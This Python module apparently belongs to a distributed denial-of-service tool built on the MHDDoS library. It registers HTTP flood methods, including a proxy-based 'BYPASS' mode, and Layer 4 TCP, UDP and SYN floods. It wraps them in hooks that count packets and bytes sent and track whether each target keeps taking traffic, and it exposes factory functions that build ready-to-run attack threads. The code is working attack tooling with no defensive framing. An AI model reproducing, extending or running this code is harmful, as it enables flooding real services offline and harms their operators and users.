from __future__ import annotations

import logging
import threading
from contextlib import suppress
from random import choice as randchoice
from typing import TYPE_CHECKING, Any

from requests import Session

from ..redaction import mask_target_key
from ..upstream.mhddos.start import HttpFlood, Layer4
from ..upstream.mhddos.start import Tools as UpstreamTools

if TYPE_CHECKING:
    from ..runner.health import TargetHealth

L4_METHODS = frozenset({"TCP", "UDP", "SYN"})

logger = logging.getLogger("BaseTool")


class Capability:
    NONE = 0
    NEEDS_PROXY = 1 << 0
    L7 = 1 << 1
    L4 = 1 << 2
    AMPLIFY = 1 << 3


METHOD_REGISTRY: dict[str, dict] = {
    "GET": {"cls": HttpFlood, "fn": "GET", "caps": Capability.L7},
    "POST": {"cls": HttpFlood, "fn": "POST", "caps": Capability.L7},
    "STRESS": {"cls": HttpFlood, "fn": "STRESS", "caps": Capability.L7},
    "SLOW": {"cls": HttpFlood, "fn": "SLOW", "caps": Capability.L7},
    "GSB": {"cls": HttpFlood, "fn": "GSB", "caps": Capability.L7},
    "BYPASS": {"cls": HttpFlood, "fn": "BYPASS", "caps": Capability.L7 | Capability.NEEDS_PROXY},
    "TCP": {"cls": Layer4, "fn": "TCP", "caps": Capability.L4},
    "UDP": {"cls": Layer4, "fn": "UDP", "caps": Capability.L4},
    "SYN": {"cls": Layer4, "fn": "SYN", "caps": Capability.L4},
}


def _payload_len(payload: Any) -> int:
    if isinstance(payload, (bytes, bytearray)):
        return len(payload)
    return len(str(payload).encode())


def _record_stats(
    stats_dict: dict,
    stats_lock: threading.Lock,
    target_key: str,
    packets: int,
    byte_count: int,
) -> None:
    with stats_lock:
        entry = stats_dict.setdefault(target_key, [0, 0])
        entry[0] += packets
        entry[1] += byte_count


def _record_success(
    target_health: TargetHealth | None,
    target_key: str,
) -> None:
    if target_health and target_health.record_success(target_key):
        logger.info("target %s recovered: traffic flowing", mask_target_key(target_key))

def _install_layer4_health_hooks(
    layer4: Layer4,
    target_key: str,
    target_health: TargetHealth | None,
) -> None:
    if target_health is None:
            return
        
    def _wrap_l4_method(orig_method):
        def wrapper(*args, **kwargs):
            target_health.record_attempt(target_key)
            try:
                return orig_method(*args, **kwargs)
            except Exception as exc:
                target_health.record_failure(target_key, exc)
                raise

        return wrapper

    for method_name in ("TCP", "UDP", "SYN"):
        orig = getattr(layer4, method_name)
        wrapped = _wrap_l4_method(orig)
        setattr(layer4, method_name, wrapped)
        if method_name in layer4.methods:
            layer4.methods[method_name] = wrapped


def _install_httpflood_health_hooks(
    http_flood: HttpFlood,
    target_key: str,
    target_health: TargetHealth | None,
) -> None:
    if target_health is None:
        return

    orig_open_connection = HttpFlood.open_connection
    def hooked_open_connection(self, host=None):
        target_health.record_attempt(target_key)
        try:
            return orig_open_connection(self, host)
        except Exception as exc:
            target_health.record_failure(target_key, exc)
            raise

    http_flood.open_connection = hooked_open_connection.__get__(http_flood, HttpFlood)


def _install_stats_hooks(
    instance: threading.Thread,
    target_key: str,
    stats_dict: dict,
    stats_lock: threading.Lock,
    target_health: TargetHealth | None = None,
) -> None:
    cls = type(instance)
    orig_send = cls._raw_send   # type: ignore[attr-defined]
    orig_sendto = cls._raw_sendto  # type: ignore[attr-defined]

    def hooked_send(self, sock, payload):
        sent = orig_send(self, sock, payload)
        if sent:
            _record_stats(stats_dict, stats_lock, target_key, 1, _payload_len(payload))
            _record_success(target_health, target_key)
        return sent

    def hooked_sendto(self, sock, payload, target):
        sent = orig_sendto(self, sock, payload, target)
        if sent:
            _record_stats(stats_dict, stats_lock, target_key, 1, _payload_len(payload))
            _record_success(target_health, target_key)
        return sent

    instance._raw_send = hooked_send.__get__(instance, cls)       # type: ignore[attr-defined]
    instance._raw_sendto = hooked_sendto.__get__(instance, cls)   # type: ignore[attr-defined]


def _install_httpflood_bypass_hooks(
    http_flood: HttpFlood,
    target_key: str,
    stats_dict: dict,
    stats_lock: threading.Lock,
    target_health: TargetHealth | None = None,
) -> None:
    def bypass_with_stats():
        if target_health:
            target_health.record_attempt(target_key)
        pro = None
        if http_flood._proxies:
            pro = randchoice(http_flood._proxies)
        try:
            with suppress(Exception), Session() as session:
                for _ in range(http_flood._rpc):
                    proxies = pro.asRequest() if pro else None
                    with session.get(http_flood._target.human_repr(), proxies=proxies) as response:
                        _record_stats(
                            stats_dict = stats_dict,
                            stats_lock = stats_lock,
                            target_key = target_key,
                            packets = 1,
                            byte_count = UpstreamTools.sizeOfRequest(response)
                        )
                    _record_success(target_health, target_key)
        except Exception as exc:  # noqa: BLE001
            if target_health:
                target_health.record_failure(target_key, exc)

    http_flood.BYPASS = bypass_with_stats     # type: ignore[attr-defined]
    if "BYPASS" in http_flood.methods:        # type: ignore[attr-defined]
        http_flood.methods["BYPASS"] = bypass_with_stats  # type: ignore[attr-defined]


def make_layer4_attack_thread(
    method: str,
    target_key: str, 
    l4_target: tuple,
    synevent: threading.Event,
    stats_dict: dict,
    stats_lock: threading.Lock,
    proxies: set | None = None,
    target_health: TargetHealth | None = None,
) -> threading.Thread:
    layer4 = Layer4(
                target=l4_target,
                method=method,
                synevent=synevent,
                proxies=proxies,    # type: ignore
            )

    _install_layer4_health_hooks(
        layer4=layer4,
        target_key=target_key,
        target_health=target_health
    )
    
    _install_stats_hooks(
        instance=layer4,
        target_key=target_key,
        stats_dict=stats_dict,
        stats_lock=stats_lock,
        target_health=target_health
    )
    
    return layer4


def make_httpflood_attack_thread(
    method: str,
    target_key: str,
    stats_dict: dict,
    stats_lock: threading.Lock,
    synevent: threading.Event,
    url,
    host: str,
    rpc: int = 1,   
    target_health: TargetHealth | None = None,
    thread_id: int | None = None,
    useragents: set[str] | None = None,
    referers: set[str] | None = None,
    proxies: set | None = None,
) -> threading.Thread:
    http_flood = HttpFlood(
        thread_id=thread_id or 0,
        target=url,
        host=host,
        method=method,
        rpc=rpc,
        synevent=synevent,
        useragents=useragents,  # type: ignore
        referers=referers,      # type: ignore
        proxies=proxies,        # type: ignore
    )

    _install_httpflood_health_hooks(
        http_flood=http_flood,
        target_key=target_key,
        target_health=target_health,        
    )    

    _install_stats_hooks(
        instance=http_flood,
        target_key=target_key,
        stats_dict=stats_dict,
        stats_lock=stats_lock,
        target_health=target_health
    )

    _install_httpflood_bypass_hooks(
        http_flood=http_flood,
        target_key=target_key,
        stats_dict=stats_dict,
        stats_lock=stats_lock,
        target_health=target_health
    )
    return http_flood
